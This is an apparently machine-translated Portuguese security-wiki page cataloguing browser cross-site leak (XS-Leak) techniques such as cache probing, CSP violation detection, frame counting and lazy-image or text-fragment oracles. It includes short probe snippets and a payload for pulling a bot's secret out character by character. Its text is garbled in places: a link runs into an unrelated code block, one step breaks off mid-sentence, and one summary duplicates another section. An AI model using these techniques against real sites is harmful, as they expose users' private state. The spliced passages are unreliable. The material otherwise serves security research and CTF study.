O atributo de integridade define um hash criptogr√°fico pelo qual o navegador pode verificar se um recurso obtido n√£o foi manipulado. Este mecanismo de seguran√ßa √© chamado de Integridade de Subrecursos (SRI). √â usado para verifica√ß√£o de integridade de recursos servidos por redes de entrega de conte√∫do (CDNs). Para prevenir vazamentos de dados, recursos de origem cruzada devem ser **habilitados para CORS**. Caso contr√°rio, a resposta n√£o √© eleg√≠vel para valida√ß√£o de integridade. Semelhante ao erro CORS no XS-Leak, √© poss√≠vel capturar a **mensagem de erro ap√≥s uma solicita√ß√£o de busca com um atributo de integridade falhar**. Um atacante pode for√ßar **intencionalmente** este **erro** em qualquer solicita√ß√£o especificando um **valor de hash falso**. Em SA, esta mensagem de erro revela o comprimento do conte√∫do do recurso solicitado. Um atacante pode usar este vazamento para detectar diferen√ßas no tamanho da resposta, o que possibilita ataques poderosos de XS-Leak.

### Viola√ß√£o/Detec√ß√£o de CSP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Resumo:** Permitindo apenas o site da v√≠tima no CSP, se tentarmos acess√°-lo e ele tentar redirecionar para um dom√≠nio diferente, o CSP acionar√° um erro detect√°vel.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Um XS-Leak pode usar o CSP para detectar se um site de origem cruzada foi redirecionado para uma origem diferente. Este vazamento pode detectar o redirecionamento, mas adicionalmente, o dom√≠nio do alvo do redirecionamento √© revelado. A ideia b√°sica deste ataque √© **permitir o dom√≠nio alvo no site do atacante**. Uma vez que uma solicita√ß√£o √© emitida para o dom√≠nio alvo, ele **redireciona** para um dom√≠nio de origem cruzada. **CSP bloqueia** o acesso a ele e cria um **relat√≥rio de viola√ß√£o usado como t√©cnica de vazamento**. Dependendo do navegador, **este relat√≥rio pode revelar o local alvo do redirecionamento**.\
Navegadores modernos n√£o indicar√£o a URL para onde foi redirecionado, mas ainda √© poss√≠vel detectar que um redirecionamento de origem cruzada foi acionado.

### Cache

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumo:** Limpar o arquivo do cache. Abre a p√°gina alvo e verifica se o arquivo est√° presente no cache.
* **Exemplo de C√≥digo**:

Navegadores podem usar um cache compartilhado para todos os sites. Independentemente de sua origem, √© poss√≠vel deduzir se uma p√°gina alvo **solicitou um arquivo espec√≠fico**.

Se uma p√°gina carrega uma imagem apenas se o usu√°rio estiver logado, voc√™ pode **invalidar** o **recurso** (para que n√£o esteja mais em cache, veja mais informa√ß√µes nos links), **realizar uma solicita√ß√£o** que poderia carregar esse recurso e tentar carregar o recurso **com uma solicita√ß√£o ruim** (por exemplo, usando um cabe√ßalho referer muito longo). Se o carregamento do recurso **n√£o acionar nenhum erro**, √© porque estava **em cache**.

### Diretiva CSP

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumo:** Diretivas de cabe√ßalho CSP podem ser sondadas com o atributo CSP do iframe.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Um novo recurso no GC permite que p√°ginas web proponham um CSP definindo um atributo em um elemento iframe. As diretivas de pol√≠tica s√£o transmitidas junto com a solicita√ß√£o HTTP. Normalmente, o conte√∫do incorporado deve permitir explicitamente isso com um cabe√ßalho HTTP, **caso contr√°rio, uma p√°gina de erro √© exibida**. No entanto, se o iframe j√° possui um CSP e a nova pol√≠tica n√£o for mais rigorosa, a p√°gina ser√° exibida normalmente.

Isso permite que um atacante detecte diretivas CSP espec√≠ficas de uma p√°gina de origem cruzada, se for poss√≠vel **detectar a p√°gina de erro**. Embora este bug agora esteja marcado como corrigido, encontramos uma **nova t√©cnica de vazamento que pode detectar a p√°gina de erro, porque o problema subjacente nunca foi resolvido.**

### **CORP**

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumo:** Recurso protegido com CORP gera erro quando buscado.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

O cabe√ßalho CORP √© um recurso de seguran√ßa de plataforma web relativamente novo que, quando configurado, **bloqueia solicita√ß√µes de origem cruzada sem CORS para o recurso dado**. A presen√ßa do cabe√ßalho pode ser detectada, porque um recurso protegido com CORP **gerar√° um erro quando buscado**.

### CORB

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumo**: CORB pode permitir que atacantes detectem quando o cabe√ßalho **`nosniff`** est√° presente na solicita√ß√£o.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Verifique o link de mais informa√ß√µes para mais detalhes sobre o ataque.

### Erro CORS na m√° configura√ß√£o de Reflex√£o de Origem <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumo**: Se o cabe√ßalho Origin for refletido no cabe√ßalho `Access-Control-Allow-Origin`, √© poss√≠vel verificar se um recurso j√° est√° no cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Caso o **cabe√ßalho Origin** esteja sendo **refletido** no cabe√ßalho `Access-Control-Allow-Origin`, um atacante pode abusar deste comportamento para tentar **buscar** o **recurso** em modo **CORS**. Se um **erro** **n√£o** for acionado, significa que foi **corretamente recuperado da web**; se um erro for **acionado**, √© porque foi **acessado do cache** (o erro aparece porque o cache salva uma resposta com um cabe√ßalho CORS permitindo o dom√≠nio original e n√£o o dom√≠nio do atacante)**.**\
Note que se a origem n√£o for refletida, mas um coringa for usado (`Access-Control-Allow-Origin: *`), isso n√£o funcionar√°.

## T√©cnica de Atributos Leg√≠veis

### Redirecionamento Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumo:** GC e SA permitem verificar o tipo da resposta (opaque-redirect) ap√≥s o redirecionamento ser conclu√≠do.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Ao enviar uma solicita√ß√£o usando a Fetch API com `redirect: "manual"` e outros par√¢metros, √© poss√≠vel ler o atributo `response.type` e se for igual a `opaqueredirect`, ent√£o a resposta foi um redirecionamento.

### COOP

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumo:** P√°ginas protegidas por COOP n√£o podem ser acessadas.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Um atacante pode revelar se o cabe√ßalho de Pol√≠tica de Abertura de Origem Cruzada (COOP) est√° dispon√≠vel em uma resposta HTTP de origem cruzada.

Aplica√ß√µes web podem implementar o cabe√ßalho de resposta COOP para impedir que outros sites obtenham refer√™ncias arbitr√°rias de janela para a aplica√ß√£o. No entanto, este **cabe√ßalho pode ser facilmente detectado** ao tentar ler a **refer√™ncia `contentWindow`**. Se um site implementa **COOP apenas em um estado**, esta propriedade (`opener`) √© **indefinida**, **caso contr√°rio** √© **definida**.

### Comprimento M√°ximo da URL - Lado do Servidor

* **M√©todos de Inclus√£o**: Fetch API, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumo:** Detectar diferen√ßas nas respostas devido ao comprimento da resposta do redirecionamento ser muito grande, fazendo com que o servidor responda com um erro e um alerta seja gerado.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Se um redirecionamento do lado do servidor usa **entrada do usu√°rio dentro do redirecionamento** e **dados extras**. √â poss√≠vel detectar esse comportamento porque geralmente os **servidores** t√™m um **limite de comprimento de solicita√ß√£o**. Se os **dados do usu√°rio** forem de **comprimento - 1**, porque o **redirecionamento** est√° usando **esses dados** e **adicionando** algo **extra**, isso acionar√° um **erro detect√°vel via Eventos de Erro**.

Se voc√™ puder de alguma forma definir cookies para um usu√°rio, tamb√©m pode realizar este ataque **definindo cookies suficientes** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) para que com o **tamanho de resposta aumentado** da **resposta correta** um **erro** seja acionado. Neste caso, lembre-se de que se voc√™ acionar esta solicita√ß√£o de um mesmo site, `<script>` enviar√° automaticamente os cookies (para que voc√™ possa verificar erros).\
Um exemplo do **cookie bomb + XS-Search** pode ser encontrado na solu√ß√£o pretendida deste writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ou estar no mesmo contexto geralmente √© necess√°rio para este tipo de ataque.

### Comprimento M√°ximo da URL - Lado do Cliente

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumo:** Detectar diferen√ßas nas respostas porque o comprimento da resposta do redirecionamento pode ser muito grande para uma solicita√ß√£o que uma diferen√ßa possa ser notada.
* **Exemplo de C√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Contagem de Frames

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumo:** Ler n√∫mero de frames (window.length).
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar o **n√∫mero de frames em uma web** aberta via `iframe` ou `window.open` pode ajudar a identificar o **status do usu√°rio naquela p√°gina**.\
Al√©m disso, se a p√°gina sempre tiver o mesmo n√∫mero de frames, verificar **continuamente** o n√∫mero de frames pode ajudar a identificar um **padr√£o** que pode vazar informa√ß√µes.

Um exemplo dessa t√©cnica √© que no Chrome, um **PDF** pode ser **detectado** com **contagem de frames** porque um `embed` √© usado internamente. Existem [Par√¢metros de URL Abertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permitem algum controle sobre o conte√∫do, como `zoom`, `view`, `page`, `toolbar` onde essa t√©cnica poderia ser interessante.

### HTMLElements

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumo:** Ler o valor vazado para distinguir entre 2 estados poss√≠veis
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Algumas p√°ginas da web podem **gerar arquivos de m√≠dia dinamicamente** dependendo das informa√ß√µes do usu√°rio ou adicionar marcas d'√°gua que alteram o tamanho da m√≠dia. Um atacante pode usar informa√ß√µes vazadas por esses elementos HTML para distinguir entre estados poss√≠veis.

Alguns HTMLElements vazar√£o algumas informa√ß√µes para origens cruzadas, como o tipo de m√≠dia que s√£o:

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) vaza a `duration` da m√≠dia e os tempos `buffered`.
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) vaza `videoHeight` e `videoWidth` alguns navegadores tamb√©m podem ter `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` e `webkitDecodedFrameCount`
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) vaza `totalVideoFrames`.
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) vaza `height` e `width`, mas se a imagem for inv√°lida, eles ser√£o 0 e [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) ser√° rejeitado.

### Propriedade CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumo:** Detectar estiliza√ß√£o do site dependendo do status do usu√°rio.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Aplica√ß√µes web podem mudar a **estiliza√ß√£o do site dependendo do status do usu√°rio**. Arquivos CSS de origem cruzada podem ser incorporados na p√°gina do atacante com o **elemento link HTML**, e as **regras** ser√£o **aplicadas** √† p√°gina do atacante. Se uma p√°gina muda essas regras dinamicamente, um atacante pode **detectar** essas **diferen√ßas** dependendo do estado do usu√°rio.\
Como t√©cnica de vazamento, o atacante pode usar o m√©todo `window.getComputedStyle` para **ler propriedades CSS** de um elemento HTML espec√≠fico. Como resultado, um atacante pode ler propriedades CSS arbitr√°rias se o elemento afetado e o nome da propriedade forem conhecidos.

### Hist√≥rico CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumo:** Detectar se o estilo `:visited` √© aplicado a uma URL indicando que j√° foi visitada
* **Exemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
De acordo com [**isto**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), isso n√£o funciona no Chrome headless.
{% endhint %}

Usando o seletor CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited), √© poss√≠vel aplicar um estilo diferente para URLs que foram visitadas.\
Anteriormente era poss√≠vel usar [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) para detectar essa diferen√ßa, mas agora os navegadores impedem isso, sempre retornando valores como se o link tivesse sido visitado e limitando quais estilos podem ser aplicados usando o seletor.\
Portanto, pode ser necess√°rio enganar o usu√°rio para clicar em uma √°rea que o CSS afetou, isso pode ser feito usando [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode).\
Tamb√©m existem maneiras de fazer isso sem intera√ß√£o do usu√°rio, como abusar dos tempos de renderiza√ß√£o, isso funciona porque leva tempo para pintar links de uma cor diferente.\
Um PoC foi fornecido em um relat√≥rio do Chromium que funciona usando v√°rios links para aumentar a diferen√ßa de tempo.

### Vazamento X-Frame do ContentDocument

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumo:** No GC, quando uma p√°gina n√£o tem permiss√£o para ser incorporada em uma p√°gina de origem cruzada devido ao **X-Frame-Options, uma p√°gina de erro √© exibida**.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

No Chrome, quando uma p√°gina n√£o tem permiss√£o para ser incorporada em uma p√°gina de origem cruzada, porque o cabe√ßalho **X-FrameOptions** (XFO) est√° definido para negar ou mesma origem, uma **p√°gina de erro √© exibida em vez disso**. Para objetos, essa p√°gina de erro pode ser **detectada verificando a propriedade `contentDocument`**. Normalmente, essa propriedade retorna nulo porque o acesso a um documento incorporado de origem cruzada n√£o √© permitido. No entanto, devido √† **renderiza√ß√£o do Chrome** da p√°gina de erro, um **objeto de documento vazio** √© retornado em vez disso. Isso n√£o funciona para iframes ou em outros navegadores. Desenvolvedores podem esquecer de definir X-Frame-Options para todas as p√°ginas e especialmente p√°ginas de erro muitas vezes n√£o t√™m esse cabe√ßalho. Como t√©cnica de vazamento, um atacante pode ser capaz de diferenciar entre diferentes estados do usu√°rio verificando isso.

### Detec√ß√£o de Download

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumo:** Atacante pode detectar downloads usando iframes. Se o iframe ainda estiver acess√≠vel, o arquivo foi baixado.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

O cabe√ßalho `Content-Disposition` ([`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)) indica se o navegador deve baixar o conte√∫do ou exibi-lo inline.

Se apenas um usu√°rio logado pudesse **acessar uma p√°gina que far√° o download de um arquivo** porque est√° usando o cabe√ßalho. √â poss√≠vel detectar esse comportamento.

#### Barra de Download <a href="#download-bar" id="download-bar"></a>

Em navegadores baseados no Chromium, quando um arquivo √© baixado, uma pr√©via do processo de download **aparece em uma barra na parte inferior**, integrada √† janela do navegador. **Monitorando a altura da janela**, os atacantes podem detectar se a "barra de download" foi aberta.

#### Navega√ß√£o de Download (com iframes) <a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

Outra maneira de testar o cabe√ßalho [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) √© **verificar se ocorreu uma navega√ß√£o**. Se um carregamento de p√°gina causar um download, ele n√£o aciona uma navega√ß√£o e a **janela permanece na mesma origem**.

#### Navega√ß√£o de Download (sem iframes) <a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

Mesma t√©cnica que a anterior, mas usando `window.open` em vez de iframes.

### Bypass do Cache HTTP Particionado <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Tempo
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumo:** Atacante pode detectar downloads usando iframes. Se o iframe ainda estiver acess√≠vel, o arquivo foi baixado.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
√â por isso que essa t√©cnica √© interessante: o Chrome agora tem **particionamento de cache**, e a chave de cache da p√°gina rec√©m-aberta √©: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mas se eu abrir uma p√°gina ngrok e usar fetch nela, a chave de cache ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, a **chave de cache √© diferente**, ent√£o o cache n√£o pode ser compartilhado. Voc√™ pode encontrar mais detalhes aqui: [Ganhando seguran√ßa e privacidade ao particionar o cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Coment√°rio de [**aqui**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Se um site `example.com` inclui um recurso de `*.example.com/resource`, ent√£o esse recurso ter√° a **mesma chave de cache** como se o recurso fosse **solicitado diretamente atrav√©s de navega√ß√£o de n√≠vel superior**. Isso ocorre porque a chave de cache √© composta pelo _eTLD+1_ de n√≠vel superior e _eTLD+1_ do frame.

Porque acessar o cache √© mais r√°pido do que carregar um recurso, √© poss√≠vel tentar mudar a localiza√ß√£o de uma p√°gina e cancel√°-la 20ms (por exemplo) depois. Se a origem foi alterada ap√≥s a parada, significa que o recurso estava em cache.\
Ou poderia apenas **enviar algum fetch para a p√°gina potencialmente em cache e medir o tempo que leva**.

### Redirecionamento Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
* **Resumo:** √â poss√≠vel descobrir se uma resposta a uma solicita√ß√£o fetch √© um redirecionamento
* **Exemplo de C√≥digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch com AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Tempo
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumo:** √â poss√≠vel tentar carregar um recurso e abortar antes que ele seja carregado, a interrup√ß√£o do carregamento √© interrompida. Dependendo se um erro √© acionado, o recurso estava ou n√£o em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) pode ser combinado com _**fetch**_ e _**setTimeout**_ para detectar se o **recurso est√° em cache** e para remover um recurso espec√≠fico do cache do navegador. Uma caracter√≠stica interessante desta t√©cnica √© que a sondagem ocorre sem armazenar novo conte√∫do no processo.

### Polui√ß√£o de Script

* **M√©todos de Inclus√£o**: Elementos HTML (script)
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumo:** Quando um **script de origem cruzada** √© inclu√≠do em uma p√°gina, **n√£o √© diretamente poss√≠vel ler** seu conte√∫do. No entanto, se um script **usa quaisquer fun√ß√µes integradas**, √© poss√≠vel **sobrescrev√™-las** e ler seus argumentos que podem **vazar informa√ß√µes valiosas**.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumo:** Medir tempo de execu√ß√£o de uma web usando service workers.
* **Exemplo de C√≥digo**:

1. O atacante registra um
```html
<img src=/something loading=lazy >
```
Portanto, o que voc√™ pode fazer √© **adicionar muitos caracteres in√∫teis** (Por exemplo, **milhares de "W"s**) para **preencher a p√°gina web antes do segredo ou adicionar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Ent√£o, se por exemplo nossa **inje√ß√£o aparecer antes da flag**, a **imagem** seria **carregada**, mas se aparecer **depois** da **flag**, a flag + o lixo ir√£o **impedir que ela seja carregada** (voc√™ precisar√° ajustar a quantidade de lixo a colocar). Foi o que aconteceu neste [**relato**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Outra op√ß√£o seria usar o **scroll-to-text-fragment** se permitido:

#### Scroll-to-text-fragment

No entanto, voc√™ faz o **bot acessar a p√°gina** com algo como
```
#:~:text=SECR
```
Ent√£o a p√°gina web ser√° algo como: **`https://victim.com/post.html#:~:text=SECR`**

Onde post.html cont√©m os caracteres de lixo do atacante e a imagem de carregamento lento e ent√£o o segredo do bot √© adicionado.

O que este texto far√° √© fazer o bot acessar qualquer texto na p√°gina que contenha o texto `SECR`. Como esse texto √© o segredo e est√° **abaixo da imagem**, a **imagem s√≥ carregar√° se o segredo adivinhado estiver correto**. Ent√£o voc√™ tem seu or√°culo para **exfiltrar o segredo caractere por caractere**.

Alguns exemplos de c√≥digo para explorar isso: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Carregamento Lento de Imagem Baseado em Tempo

Se **n√£o for poss√≠vel carregar uma imagem externa** que poderia indicar ao atacante que a imagem foi carregada, outra op√ß√£o seria tentar **adivinhar o caractere v√°rias vezes e medir isso**. Se a imagem for carregada, todas as solicita√ß√µes levar√£o mais tempo do que se a imagem n√£o for carregada. Isso foi o que foi usado na [**solu√ß√£o deste writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqui:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

